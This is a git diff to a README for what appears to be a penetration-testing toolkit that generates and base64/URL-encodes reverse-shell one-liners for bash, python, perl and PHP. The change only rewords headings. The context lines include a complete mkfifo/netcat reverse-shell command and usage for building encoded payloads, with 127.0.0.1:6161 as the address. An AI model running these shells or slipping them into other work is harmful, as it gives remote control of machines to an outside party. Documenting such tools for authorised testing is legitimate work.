@@ -55,19 +55,19 @@ export PATH=$PATH:$HOME/.local/bin
 ```
 
 
-4. Piping into rs_b64encode.py:
+4. Pipe into rs_b64encode.py:
 ```bash
 ./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash | ./rs_b64encode.py
 ```
 
 
-5. Piping into rs_b64encode.py and construction echo decode payload:
+5. Pipe into rs_b64encode.py and construction echo decode payload:
 ```bash
 ./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash | ./rs_b64encode.py --echo
 ```
 
 
-6. Piping into rs_b64encode.py and construction echo decode url_quote_plus encode payload:
+6. Pipe into rs_b64encode.py and construction echo decode url_quote_plus encode payload:
 ```bash
 ./rs_oneliner.py -i 127.0.0.1 -p 6161 --bash | ./rs_b64encode.py --echo --url
 ```
@@ -87,19 +87,19 @@ echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6161 >/
 ```
 
 
-9. Piping with rs_oneliner.py:
+9. Pipe with rs_oneliner.py:
 ```bash
 ./rs_oneliner.py -i 127.0.0.1 -p 6161 --python | ./rs_b64encode.py
 ```
 
 
-10. Piping with rs_oneliner.py and construction echo decode payload:
+10. Pipe with rs_oneliner.py and construction echo decode payload:
 ```bash
 ./rs_oneliner.py -i 127.0.0.1 -p 6161 --perl | ./rs_b64encode.py --echo
 ```
 
 
-11. Piping into rs_b64encode.py and construction echo decode url_quote_plus encode payload:
+11. Pipe into rs_b64encode.py and construction echo decode url_quote_plus encode payload:
 ```bash
 ./rs_oneliner.py -i 127.0.0.1 -p 6161 --phpsystem | ./rs_b64encode.py --echo --url
 ```
